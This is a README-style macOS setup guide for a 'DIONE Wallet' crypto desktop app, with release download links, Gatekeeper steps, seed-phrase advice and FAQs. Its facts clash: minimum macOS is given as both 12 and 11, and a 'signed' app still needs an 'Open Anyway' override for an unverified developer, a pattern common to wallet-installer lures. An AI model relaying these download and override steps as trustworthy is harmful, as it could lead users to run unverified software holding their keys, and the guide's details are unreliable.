![DIONE Wallet](assets/banner-article.png)

# DIONE Wallet Setup for macOS (Intel and Apple Silicon)

<p align="center">macOS setup on Intel and Apple Silicon</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE Wallet runs on macOS 11 or later on both Intel and Apple Silicon Macs from one signed disk image. Open the downloaded `.dmg`, drag the app to Applications, then approve it once in Privacy & Security if Gatekeeper blocks the first launch. From there you create or restore a wallet whose keys stay encrypted on the Mac.

## What the Mac build needs

macOS 11 Big Sur or newer, 4 GB of RAM, 500 MB of free disk space and an internet connection for the first sync. Both Intel and Apple Silicon are supported, so a Mac from 2015 and a current M-series machine take the same download; there is no separate ARM build to hunt for and no emulation layer to install.

One macOS-specific habit is worth forming here: the download page gives the stated size for each platform, and the disk image is the largest of the three, because the desktop application ships its own UI runtime and signing libraries rather than leaning on the browser you already have. It still reads the chain from a node endpoint; the size is an application, not a ledger.

## Download and mount the disk image

Get the macOS build from the official download page only. Skip any link that arrives by direct message, any search result advertising a "Mac installer" and any third-party download portal that wraps the file in its own page - the team never sends installers to users, and impersonation is the common failure mode around this product rather than a theoretical risk.

Open the `.dmg` and you will see the app beside an Applications folder shortcut. Drag the app to Applications. Do not run it from inside the mounted image: a copy launched from the disk image behaves normally until the image is ejected, which is exactly why "it worked yesterday and now it will not open" happens to Mac users who skipped this step.

If you want to check the file before trusting it, [Verify a Genuine DIONE Wallet Download](https://github.com/dione-protocol/keys-and-transfers/blob/main/verify-a-genuine-dione-wallet-download.md) gives the verification route, and the same reasoning applies to the disk image as to the Windows executable.

## First launch and the Gatekeeper prompt

1. Open DIONE Wallet from Applications.
2. If macOS says the app cannot be opened because the developer cannot be verified, do not move it to the Trash.
3. Open System Settings, go to Privacy & Security, and find the line about the blocked app.
4. Choose Open Anyway, then confirm.
5. The app opens normally from then on.

That flow is Apple's generic gate for any app distributed outside the App Store, and it appears the first time only. Disabling Gatekeeper system-wide is not required, and a wallet that asks you to do that should be treated as a warning rather than an instruction.

A second, rarer variant: macOS may refuse to open the app because the quarantine attribute survived a partial download. Deleting the app, re-downloading from the official page and repeating the drag to Applications fixes it; the cause is an interrupted transfer, not the app.

## Create or restore the wallet

On first run, choose between a new wallet and an existing one. A new wallet generates a BIP-39 phrase of 12 or 24 words, encrypts it on the Mac and asks you to confirm the words before the wallet is usable. Write them down; a screenshot is not a backup, and neither is a note in a synced to-do list.

If you are moving from another wallet that supports the same standard, restore from the phrase instead so the address and its balance come with you. [Create a New DIONE Wallet: First Run Walkthrough](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/create-a-new-dione-wallet.md) walks the first path, [Import a Seed Phrase Into DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/import-a-seed-phrase-into-dione-wallet.md) the second, and [Back Up a DIONE Wallet Seed Phrase Properly](https://github.com/dione-protocol/keys-and-transfers/blob/main/back-up-a-dione-wallet-seed-phrase.md) is the part most people skip until they need it.

## Apple Silicon specifics

On an M-series Mac the app runs natively, so there is no Rosetta prompt and nothing to install to bridge architectures. The practical difference from Intel is memory behaviour: the app is lighter under Rosetta-free execution, and the first sync completes faster on a machine that is not translating instructions.

If the app feels sluggish on an older Intel Mac, the cause is usually background chain sync competing for CPU while the machine also runs a browser, not the wallet itself. Letting the first sync finish before doing anything else settles it.

## Locating the data and moving machines

The wallet's data lives in your user's Application Support folder, and the seed phrase - not that folder - is what restores access on another machine. Copying the folder to a new Mac is not a supported migration path and is not needed: install the app, restore from the phrase, and the same addresses appear. That is also why a Mac that will not boot is an inconvenience rather than a loss, provided the phrase exists on paper.

Treat the phrase as the only key. It is portable to any BIP-39-compliant wallet, which is the real meaning of non-custodial: the app is a way to use the keys, not a place that holds them.

## Keep the Mac build current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Updates arrive through the app's signed auto-update, which verifies each update binary against a pinned signing key before applying it and rejects anything that fails. That is why the first answer to odd behaviour is the current release from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9): a build that is behind can show a stale balance or fail to reconnect, and the maintained release fixes both.

## FAQ

### Can I run DIONE Wallet on Apple Silicon?

Yes. Apple Silicon Macs run the app natively with no Rosetta installation, on the same disk image as Intel Macs.

### Which macOS version is required?

macOS 11 or later. Older systems are outside the supported range, and the app will not install cleanly on them.

### Why will the app not open after I installed it?

Almost always Gatekeeper, because the first launch of an app distributed outside the App Store needs approval in Privacy & Security. Choose Open Anyway once; if the app was launched from inside the mounted image rather than from Applications, move it and open it again.

### Does the Mac app need a separate chain download?

No. The desktop application includes everything it needs to sign and send for Odyssey Chain - chain ID 153153, native currency DIONE - with no plugin or add-on. It reads the chain over a node endpoint rather than storing a copy of it, which is why the first launch wants a connection.

Once the Mac is running, the next decisions are the same on every platform: back up the phrase properly, confirm the first receive address before funding it, and keep the build current from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9). Windows readers start at [Install DIONE Wallet on Windows 10 or 11](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/install-dione-wallet-on-windows.md), Linux readers at [Run DIONE Wallet on Linux](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/run-dione-wallet-on-linux.md), and a Mac whose balance looks wrong after a restore is usually a network question answered in [DIONE Wallet Not Syncing: What to Check First](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-not-syncing.md) rather than a macOS one.
